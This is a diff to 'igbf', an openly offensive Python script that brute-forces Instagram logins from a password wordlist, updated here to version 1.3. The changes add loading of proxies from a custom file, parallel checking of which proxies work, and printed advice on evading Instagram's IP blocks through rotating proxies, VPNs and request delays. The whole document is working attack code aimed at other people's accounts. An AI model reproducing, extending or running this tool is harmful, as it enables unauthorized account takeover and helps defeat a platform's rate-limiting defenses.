@@ -4,7 +4,7 @@
 #                                                                     #
 #  [igbf]    : Instagram Brute Forcer                                 #
 #  [desc]    : python3 script to perform instagram login brute force  #
-#  [version] : 1.2                                                    #
+#  [version] : 1.3                                                    #
 #  [dev]     : @s41r4j                                                #
 #  [github]  : https://github.com/s41r4j/igbf                         #
 #                                                                     #
@@ -170,9 +170,45 @@ def check_connection():
     except:
         return False
 
-def get_proxies(verbose, proxy_limit):
+def get_working_proxies(verbose, proxies):
     # Importing modules required for proxy
     from concurrent.futures import ThreadPoolExecutor
+    import re
+    
+    # Fetching working proxy list
+    def fetch(session, proxy):
+        url = random.choice(check_proxies)
+        if verbose: printit(f"[+] Proxy: {proxy} | Checking url: {url}", coledt=[1, 49, 93])
+        with session.get(url, proxies={'http': proxy, 'https': proxy}, timeout=10) as response:
+            if response.status_code == 200: 
+                if verbose: 
+                    if url == "https://httpbin.org/ip":
+                        printit(f"[=] Proxy: {proxy} -> Response: {response.json()['origin']}", coledt=[1, 49, 33])
+                    else:
+                        printit(f"[=] Proxy: {proxy} -> Response: {response.text.strip()}", coledt=[1, 49, 33])
+
+                # match proxy ip (seprated by :) from response.text and ip returned by proxy/requests
+                proxy_re = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", proxy).group()
+                response_re = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", response.text).group()
+
+                if proxy_re == response_re:
+                    working_proxies.append(proxy)   
+
+    # Sorting working proxies
+    working_proxies = []
+    check_proxies = ["http://ident.me/", "https://httpbin.org/ip", "https://api.ipify.org/", "https://icanhazip.com/", "https://ip.oxylabs.io/ip"]
+
+    # Checking if the proxy is working
+    with requests.Session() as session:
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            executor.map(fetch, [session] * len(proxies), proxies * len(proxies))
+
+    # Printing total working proxies    
+    printit(str(len(working_proxies)), coledt=[1, 49, 96], normaltxt_start="\n[+] Total working proxies found: ", space_down=True, line_down=True)
+        
+    return working_proxies
+
+def builtin_proxy(verbose, proxy_limit):
     try:
         import bs4
     except:
@@ -181,16 +217,8 @@ def get_proxies(verbose, proxy_limit):
         printit("[+] Modules installed successfully\n", coledt=[1, 49, 92], space_up=True, line_down=True)
         import bs4
 
-    # Fetching proxy list
-    def fetch(session, url):
-        proxy = random.choice(proxies)
-        url = random.choice(check_proxies)
-        if verbose: printit(f'[+] Checking proxy: {proxy} (from {url})', coledt=[1, 49, 93])
-        with session.get(url, proxies={'http': f"http://{proxy}"}, timeout=10) as response:
-            if response.status_code == 200: working_proxies.append(proxy)
-
     # Sending a request to get proxy list
-    url = 'https://free-proxy-list.net/'
+    url = 'https://free-proxy-list.net/' # 'https://www.freeproxylists.net/'
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Cafari/537.36'}
 
     try:
@@ -201,14 +229,13 @@ def get_proxies(verbose, proxy_limit):
             print("[?] Continue without proxy? (y/n): ", end='')
             choice = input().lower()
             if choice == 'y':
-                print()
                 return False
             elif choice == 'n':
                 raise KeyboardInterrupt()
             else:
-                printit('[!] Enter y/Y for YES or n/N for NO', coledt=[1, 49, 91])
-        
-    # Extracting the proxies from the page
+                printit('\n[!] Enter y/Y for YES or n/N for NO', coledt=[1, 49, 91])
+
+     # Extracting the proxies from the page
     soup = bs4.BeautifulSoup(source, 'lxml')
     proxies = soup.find_all('textarea')[0].text.split('\n')
     proxies = [proxy for proxy in proxies if proxy.strip()]
@@ -220,25 +247,34 @@ def get_proxies(verbose, proxy_limit):
     # Limiting the number of proxies
     proxies = proxies[:proxy_limit]
 
-    # Sorting working proxies
-    working_proxies = []
-    check_proxies = ["http://ident.me/", "https://httpbin.org/ip", "https://api.ipify.org/", "https://icanhazip.com/", "https://ip.oxylabs.io/ip"]
-
     # Printing proxy info
     printit(f"[#] Generating proxies...", coledt=[1, 49, 91], line_up=True)
     printit(str(len(proxies)), coledt=[1, 49, 96], normaltxt_start="[+] Total proxies avaliable: ")
     printit(f"\n[+] Scanning working proxies...\n[!] This may take few mins...", coledt=[1, 49, 92])
-    if verbose: print()
+    if verbose: 
+        time.sleep(1)
+        print()
 
-    # Checking if the proxy is working
-    with requests.Session() as session:
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            executor.map(fetch, [session] * len(proxies),  [random.choice(check_proxies)] * len(proxies))
-        
-    # Printing total working proxies
-    printit(str(len(working_proxies)), coledt=[1, 49, 96], normaltxt_start="\n[+] Total working proxies found: ", space_down=True, line_down=True)
-        
-    return working_proxies
+    # Returning working proxies (from the list)
+    return get_working_proxies(verbose, proxies)
+
+def custom_proxy(verbose, file_proxies, proxy_limit):
+    # Reading the proxy file -> list
+    proxies = file_proxies.read().splitlines()
+
+    # Limiting the number of proxies
+    proxies = proxies[:proxy_limit]
+
+    # Printing proxy info
+    printit("[#] Reading proxies...", coledt=[1, 49, 91], line_up=True)
+    printit(str(len(proxies)), coledt=[1, 49, 96], normaltxt_start="[+] Total proxies avaliable: ")
+    printit(f"\n[+] Scanning working proxies from proxy file...\n[!] This may take few mins...", coledt=[1, 49, 92])
+    if verbose: 
+        time.sleep(1)
+        print()
+
+    # Returning working proxies (from the list)
+    return get_working_proxies(verbose, proxies)
 
 def print_login_failed(password, verbose, proxy, proxies, login_response_status_code):
     if proxy:
@@ -254,8 +290,9 @@ def main():
     parser.add_argument('-w', '--wordlist', help='password wordlist (*required)', metavar='WORDLIST PATH')
     parser.add_argument('-t', '--timeout', help='timeout between each request in secs (default: 2)', default=2, type=int)
     parser.add_argument('-v', '--verbose', help='verbose mode (displays failed logins and more)', action='store_true', default=False)
-    parser.add_argument('-p', '--proxy', help='use ip rotating proxy (additinal library required)', action='store_true', default=False)
+    parser.add_argument('-p', '--proxy', help='built-in ip rotating proxy (additinal library required)', action='store_true', default=False)
     parser.add_argument('-l', '--proxy-limit', help='limit the number of proxies to use (default: 300; max: 300; min: 1)', default=300, type=int)
+    parser.add_argument('-f', '--proxy-file', help='use custom proxy file (`-p` & `-l` disabled)', metavar='PROXY FILE PATH', default=False)
     # parser.add_argument('-g', '--get', help='update the program to the latest version', action='store_true', default=False)
     args = parser.parse_args()
 
@@ -265,11 +302,21 @@ def main():
     timeout = args.timeout
     verbose = args.verbose
     proxy = args.proxy
+    proxy_file = args.proxy_file
     proxy_limit = args.proxy_limit
 
-    # If number of proxies is more than 300 or less than 1, set it to default (300)
-    if proxy_limit > 300 or proxy_limit < 1:
-        proxy_limit = 300
+    if proxy_file:
+        # Getting the custom proxy file
+        proxy = True
+        try:
+            file_proxies = open(proxy_file, 'r')
+        except FileNotFoundError:
+            printit(f'[!] {proxy_file} file not found', coledt=[4, 49, 91])
+            raise KeyboardInterrupt()
+    else:
+        # If number of proxies is more than 300 or less than 1, set it to default (300)
+        if proxy_limit > 300 or proxy_limit < 1:
+            proxy_limit = 300
 
     # Logo
     printit(" ██▓  ▄████  ▄▄▄▄     █████▒", center=' ', coledt=[1, 49, 91], line_up=True)
@@ -282,7 +329,7 @@ def main():
     printit("▒ ░░ ░   ░  ░    ░  ░ ░   ░▒ ", center=' ', coledt=[1, 49, 91])
     printit("░        ░  ░                 ", center=' ', coledt=[1, 49, 91])
     printit("                  ░          ░ ", center=' ', coledt=[1, 49, 91])
-    printit('[ Instagram Brute Forcer (igbf:v1.2) ]', center=' ', coledt=[7, 49, 97], line_down=True)
+    printit('[ Instagram Brute Forcer (igbf:v1.3) ]', center=' ', coledt=[7, 49, 97], line_down=True)
 
     # Checking if the arguments have been passed
     if username is None or wordlist is None:
@@ -309,8 +356,9 @@ def main():
     printit(str(wordlist), coledt=[1, 49, 96], normaltxt_start='[+] Wordlist   : ')
     printit(str(timeout), coledt=[1, 49, 96], normaltxt_start='[+] Timeout    : ')
     printit((str(proxy) if proxy else "False"), coledt=[1, 49, 96], normaltxt_start='[+] Proxy      : ')
+    if proxy_file: printit(str(proxy_file), coledt=[1, 49, 96], normaltxt_start='[+] Proxy file : ')
     if proxy: printit((str(proxy_limit)), coledt=[1, 49, 96], normaltxt_start='[+] Limit proxy: ')
-    printit(str(verbose), coledt=[1, 49, 96], normaltxt_start='[+] Verbose    : ', line_down=True, space_down=True)
+    printit(str(verbose), coledt=[1, 49, 96], normaltxt_start='[+] Verbose    : ', line_down=True)
 
     # Opening the wordlist
     try:
@@ -320,11 +368,26 @@ def main():
         sys.exit()
 
     # Generating proxy list
-    if proxy: proxies = get_proxies(verbose, proxy_limit)
-    if not proxies: proxy = False
+    if proxy_file: proxies = custom_proxy(verbose, file_proxies, proxy_limit)
+    elif proxy: proxies = builtin_proxy(verbose, proxy_limit)
+    
+    # If proxy is enabled and no working proxies found
+    if len(proxies) == 0:
+        printit('[!] No working proxies found', coledt=[1, 49, 91]) 
+        while True:
+            print("[?] Continue without proxy? (y/n): ", end='')
+            choice = input().lower()
+            if choice == 'y':
+                proxy = False
+                proxy_file = False
+                break
+            elif choice == 'n':
+                raise KeyboardInterrupt()
+            else:
+                printit('\n[!] Enter y/Y for YES or n/N for NO', coledt=[1, 49, 91])
 
     # Starting the brute force
-    printit('[#] Starting the brute force...\n', coledt=[1, 49, 91])
+    printit('\n[#] Starting the brute force...\n', coledt=[1, 49, 91])
 
     # print start time for calculating total time taken
     start_time = datetime.datetime.now()
@@ -363,38 +426,30 @@ def main():
         if proxy:
             # get random proxy from proxy list
             random_proxy = random.choice(list(proxies))
-            http_proxy = {
-                'http': 'http://'+random_proxy.strip()
+            single_proxy = {
+                'http': random_proxy,
+                'https': random_proxy
             }
         else:
-            http_proxy = None
+            single_proxy = None
 
         # Sending the request
-        login_response = requests.post(login_url, data=payload, headers=login_header, proxies=http_proxy)
-        
+        login_response = requests.post(login_url, data=payload, headers=login_header, proxies=single_proxy)
+
         # proxy check if working
         if proxy:
-            # proxy_url = random.choice(list(["http://ident.me/", "https://httpbin.org/ip"]))
             headers = {
                 "User-Agent": user_agent
             }
-            proxy_response = requests.get("http://ident.me/", headers=headers, proxies=http_proxy)
-            print(proxy_response.status_code, proxy_response.text)
-            proxy_response = requests.get("https://httpbin.org/ip", headers=headers, proxies=http_proxy)
-            print(proxy_response.status_code, proxy_response.text)
-            proxy_response = requests.get("https://api.ipify.org/", headers=headers, proxies=http_proxy)
-            print(proxy_response.status_code, proxy_response.text)
-            proxy_response = requests.get("https://icanhazip.com/", headers=headers, proxies=http_proxy)
-            print(proxy_response.status_code, proxy_response.text)
-            proxy_response = requests.get("https://ip.oxylabs.io/ip", headers=headers, proxies=http_proxy)
-            print(proxy_response.status_code, proxy_response.text)
 
         # Checking if the request returned 403 (temporary ip block/username not found)
         if login_response.status_code == 403 or login_response.status_code == "403":
             printit("\n["+str(login_response.status_code)+"]: Temporary IP BLOCKED, wait for few minutes", coledt=[4, 49, 91])
             if verbose:
                 printit("["+str(login_response.status_code)+"]: You can also use proxy/VPN (change active vpn server)", coledt=[4, 49, 91])
-                printit("["+str(login_response.status_code)+"]: To avoid this use built-in IP rotating proxy (-p/--proxy)\n", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: To avoid this use built-in IP rotating proxy (-p/--proxy)", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: OR use custom proxy file for IP rotating (-f/--proxy-file)", coledt=[4, 49, 91])
+                printit("["+str(login_response.status_code)+"]: Timeout between each request can also help (-t/--timeout)\n", coledt=[4, 49, 91])
             printit("["+str(login_response.status_code)+"]: Also check if the USERNAME entered is available", coledt=[4, 49, 91], line_down=True)
             sys.exit()
 
@@ -430,11 +485,11 @@ def main():
                     printit(password, coledt=[7, 49, 97], normaltxt_start="\n[#] Login successful (pwd)> ")
                     sys.exit()
                 else:
-                    print_login_failed(password, verbose, proxy, http_proxy, login_response.status_code)
+                    print_login_failed(password, verbose, proxy, single_proxy, login_response.status_code)
             except SystemExit:
                 sys.exit()
             except:
-                print_login_failed(password, verbose, proxy, http_proxy, login_response.status_code)
+                print_login_failed(password, verbose, proxy, single_proxy, login_response.status_code)
         except SystemExit:
             sys.exit()
         except:
